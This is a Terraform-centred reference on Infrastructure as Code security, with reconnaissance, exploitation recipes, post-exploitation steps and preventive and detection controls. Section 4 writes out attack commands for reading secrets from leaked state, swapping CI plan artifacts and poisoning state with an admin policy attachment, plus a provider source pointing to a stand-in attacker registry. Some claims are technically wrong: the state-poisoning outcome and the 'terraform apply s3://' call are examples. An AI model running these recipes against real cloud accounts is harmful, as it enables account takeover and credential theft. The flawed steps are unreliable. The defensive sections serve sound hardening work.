# IaC Fundamentals

Reference for the Infrastructure as Code execution model, the artifact chain from source to running infrastructure, and the trust boundaries that an attacker or defender must reason about.

## 1. Overview

Infrastructure as Code (IaC) is the practice of describing cloud infrastructure in files that a tool translates into API calls. The file is the source of truth; the running infrastructure is a projection of it. This shifts the security perimeter: an attacker who can modify the IaC file, its inputs, or its execution environment effectively controls the provisioned infrastructure.

The IaC artifact chain:

```
source repo -> build step -> plan/artifact -> apply/execution -> running infrastructure
    |              |              |              |                       |
  review         lockfile      state diff     provider creds         cloud resources
```

Every stage is a trust boundary. A compromise at any stage can inject infrastructure that the operator never intended.

Major IaC tool categories:

| Tool | Model | Language | State |
|------|-------|----------|-------|
| Terraform | Declarative | HCL | Yes (state file) |
| OpenTofu | Declarative | HCL | Yes (state file, Terraform-compatible) |
| CloudFormation | Declarative | YAML/JSON | Yes (stack, provider-managed) |
| Pulumi | Imperative | Python/Go/TS/C#/Java | Yes (stack, provider-managed) |
| Helm | Templated YAML | Go template | No (release state in cluster) |
| Ansible | Imperative | YAML | No (idempotent playbooks) |

## 2. Reconnaissance / Enumeration

### Offensive

- **Public repositories.** Look for `terraform.tfvars`, `*.tfstate`, `.terraform/`, `cloudformation.yaml`, `Pulumi.yaml`. GitHub code search and public repo clones reveal provider credentials, resource ARNs, account IDs.
- **CI/CD exposure.** Build logs sometimes print plan output, variable values, or state diffs. Logs are often accessible to anyone with read access to the CI.
- **S3/GCS/Azure Blob state buckets.** Terraform state backends are often misconfigured: public bucket, weak bucket policy, no versioning, no encryption. `aws s3 ls s3://<account>-terraform-state/` with any low-privilege cloud credential reveals state file names and structure.
- **State bucket naming.** Common patterns: `<org>-terraform-state`, `<org>-tfstate`, `<account-id>-tf`. Enumerate via `aws s3api list-buckets` if you have credentials.
- **Terraform Cloud / Spacelift / Env0 / Atlantis.** Managed IaC platforms expose APIs that list workspaces, runs, and variables. If a low-privilege API token is available, it may allow reading sensitive variables (unless explicitly masked).
- **Backend configuration.** `.terraform/terraform.tfstate` (local backend state) may be committed by accident and reference remote backend configuration with credentials.

### Defensive

- Inventory all IaC repositories, states, and CI/CD pipelines that apply to production.
- Confirm state backends are private, encrypted, and versioned.
- Confirm plan output is not logged in CI with variable values visible.
- Confirm no `.tfstate` / `.tfvars` files are committed to any repository.

## 3. Common Attack Vectors

- **State file leakage.** Terraform state contains every resource attribute, including sensitive ones: passwords, keys, connection strings. A leaked state file is full credential disclosure for the managed infrastructure.
- **Plan artifact manipulation.** The plan file (`plan.out`) is trusted by `terraform apply`. If an attacker can swap the plan between plan and apply steps, infrastructure is created from attacker input.
- **Provider credential compromise.** IaC tools authenticate to cloud providers with credentials in CI/CD. Compromising the CI/CD pipeline yields the credentials.
- **Module / provider registry supply chain.** A module or provider pulled from a public registry can execute arbitrary code at plan time or inject infrastructure at apply time.
- **Backend tampering.** State locking backend (S3, GCS, Azure Blob, Terraform Cloud) with weak access control allows state poisoning.
- **Drift exploitation.** Manual changes to infrastructure that IaC does not track become invisible to the pipeline and may be attacker persistence.
- **Policy bypass.** IaC that provisions resources bypassing organizational policy (security groups with `0.0.0.0/0`, public buckets, unencrypted volumes).
- **Secret injection via output.** IaC outputs that reference secrets are stored in state and printed in logs.

## 4. Exploitation Recipes

### 4.1 Terraform state leakage to cloud takeover

```bash
# Misconfigured state bucket, readable by any authenticated principal:
$ aws s3 ls s3://acme-terraform-state/prod/
2026-10-01 12:34:56      12345 terraform.tfstate

$ aws s3 cp s3://acme-terraform-state/prod/terraform.tfstate .
$ jq '.resources[] | select(.type=="aws_iam_access_key")' terraform.tfstate
{
  "type": "aws_iam_access_key",
  "name": "deployer",
  "instances": [{
    "attributes": {
      "id": "AKIA...",
      "secret": "<SECRET_ACCESS_KEY>",
      "user": "deployer"
    }
  }]
}
```

Expected result: long-lived access keys for the deployer user, which likely has broad permissions.

### 4.2 Public GitHub Terraform leak

Look for `.tfvars` or `*.tfstate` committed to public repos. Even a `terraform.tfstate` for a non-production environment often contains real provider credentials.

### 4.3 Provider plugin supply chain attack

```hcl
# A malicious provider registry entry with the same name as the legitimate one:
terraform {
  required_providers {
    aws = {
      source  = "attacker-registry.example.com/hashicorp/aws"
      version = "5.99.0"
    }
  }
}
```

If the operator does not pin the source to `hashicorp/aws`, the malicious provider runs at plan time with cloud credentials.

### 4.4 CI plan tampering

If CI has separate plan and apply jobs, an attacker who can trigger a new plan job or write to the plan artifact store can swap the plan:

```bash
$ terraform plan -out=plan.out
# CI artifact store compromise:
$ aws s3 cp attacker-plan.out s3://ci-artifacts/prod-plan.out
$ # Next apply step: terraform apply s3://ci-artifacts/prod-plan.out
```

The infrastructure created is from `attacker-plan.out`, not from `plan.out`.

### 4.5 State poisoning

```bash
# Attacker with write access to the state bucket uploads a crafted state:
$ jq '.resources += [{"mode":"managed","type":"aws_iam_policy_attachment","name":"admin","instances":[{"attributes":{"policy_arn":"arn:aws:iam::aws:policy/AdministratorAccess","user":"attacker"}}]}]' \
  terraform.tfstate > poison.tfstate
$ aws s3 cp poison.tfstate s3://acme-terraform-state/prod/terraform.tfstate
```

On the next apply, Terraform creates the Admin attachment.

### 4.6 Policy bypass via drift

Manual change: `aws s3api put-bucket-acl --bucket prod-data --acl public-read`. On the next `terraform apply`, the change is reverted (drift). But until the next apply, the bucket is public and unattested. Attackers use drift as a temporary exposure window.

## 5. Post-Exploitation

- **Persist in state.** Craft a resource in the state that survives future plans (a resource the configuration will not overwrite), or add a resource to the configuration that is not reviewed.
- **Persist in modules.** Publish a modified module version to the registry or to an internal mirror.
- **Persist in CI.** Modify the pipeline definition to include a post-apply step that runs an attacker payload.
- **Lateral movement via provider creds.** The provider credential used by CI is often the highest-privilege identity in the account. Assume it, then pivot.
- **Exfiltrate state.** Copy the state to the attacker's infrastructure. Future plans continue to work because the backend is still accessible, but the attacker now has the full inventory.

## 6. Preventive Controls

- **Remote state backend.** S3, GCS, Azure Blob, or Terraform Cloud with encryption, versioning, and access logging. Never local backend on developer laptops.
- **State bucket access.** Only the CI identity and the security team. No developer read access to production state.
- **State file encryption at rest.** Provider-managed keys are acceptable; customer-managed keys are stronger.
- **No secrets in IaC.** Reference secrets from a secret manager via `data` blocks or provider-native secret injection, not from `variable` values in state.
- **Sensitive attribute marking.** `sensitive = true` on variables and outputs. Note: this only hides them from CLI output, they are still in state.
- **Plan file signing.** If the plan is transferred between jobs, sign it. Better: run plan and apply in the same job.
- **Provider source pinning.** Pin `source` to the exact registry namespace and version. Lock file (`.terraform.lock.hcl`) committed.
- **Module source pinning.** Pin modules to a tag or commit SHA. Commit `go.sum` equivalent for HCL.
- **Policy as Code.** OPA/Conftest, Sentinel, Checkov, tfsec in the pipeline. Reject plans that violate policy.
- **Drift detection.** Scheduled `terraform plan` in read-only mode, alerts on diff.

## 7. Detection Controls

- **Cloud audit logs.** CloudTrail / Activity Log / Cloud Audit Logs for `Create*`, `Modify*`, `Delete*` calls from the CI identity outside the deployment window.
- **State bucket access logs.** S3 server access logs, GCS access logs, Azure Blob diagnostic logs. Any read by a principal outside CI is suspicious.
- **IaC platform audit.** Terraform Cloud / Spacelift audit logs for workspace changes, variable changes, run triggers.
- **Pipeline changes.** Any change to the pipeline configuration file (`pipeline.yml`, `.github/workflows/*.yml`, `cloudbuild.yaml`) triggers a review.
- **Drift detection alerts.** Any plan diff outside a deployment window.
- **Policy violation alerts.** Any rejected plan is a signal that someone is trying a configuration the policy forbids.
- **Secret scanning.** GitHub Secret Scanning, trufflehog, gitleaks on IaC repos and state files.

## 8. Verification

- [ ] All state backends are remote, encrypted, versioned, and access-logged.
- [ ] No developer has read access to production state.
- [ ] No secrets in `.tfvars`, committed state, or plan artifacts.
- [ ] `.terraform.lock.hcl` committed; provider sources pinned.
- [ ] Module sources pinned to tag or SHA.
- [ ] Plan and apply run in the same job, or the plan file is signed.
- [ ] Policy as Code (OPA, Sentinel, Checkov, tfsec) runs on every plan.
- [ ] Drift detection runs on schedule and alerts on diff.
- [ ] Secret scanning covers IaC repos and state file buckets.
- [ ] Cloud audit logs cover the CI identity.

## 9. Certification Alignment

- **HashiCorp Certified: Terraform Associate:** state management, remote backends, workspaces, providers.
- **AWS Certified DevOps Engineer - Professional:** Domain 2 (Configuration Management and IaC), Domain 4 (Monitoring and Logging).
- **AWS Certified Security - Specialty:** Domain 3 (Infrastructure Security).
- **Google Cloud Professional Cloud DevOps Engineer:** Sections on IaC and CI/CD.
- **Azure DevOps Engineer Expert (AZ-400):** infrastructure as code, security, pipeline security.
- **CompTIA Security+:** Domains 2-4.

## 10. Production Notes

- **State file size matters.** Very large state files indicate a monolith. Split into per-service states with separate backends to limit blast radius.
- **`terraform apply -auto-approve` in CI is common.** It removes the review step. Acceptable only when policy as code reviews the plan programmatically.
- **Manual changes bypass IaC.** Any change made via console is not tracked by the IaC repo. Drift detection is the only control.
- **Provider credential scope.** CI credentials should be scoped to the specific resources the pipeline manages, not admin. Assume-role with a permission boundary.
- **Out-of-band drift window.** Attackers use the time between a manual change and the next `terraform apply` for persistence. Reduce the window by running `terraform plan` on schedule.

## 11. References

- HashiCorp Terraform recommended practices - https://developer.hashicorp.com/terraform/cloud-docs/recommended-practices
- Terraform sensitive data in state - https://developer.hashicorp.com/terraform/language/state/sensitive-data
- Terraform provider source - https://developer.hashicorp.com/terraform/language/providers/requirements
- Terraform dependency lock file - https://developer.hashicorp.com/terraform/language/files/dependency-lock
- AWS CloudFormation security best practices - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/security-best-practices.html
- Pulumi CrossGuard (policy as code) - https://www.pulumi.com/docs/using-pulumi/crossguard/
- Open Policy Agent - https://www.openpolicyagent.org/docs/latest/
- Checkov - https://www.checkov.io/
- tfsec / Trivy - https://trivy.dev/
- NIST SP 800-204D (Securing the Software Supply Chain) - https://csrc.nist.gov/publications/detail/sp/800-204d/final
- CIS Benchmarks for Terraform - https://www.cisecurity.org/benchmark/terraform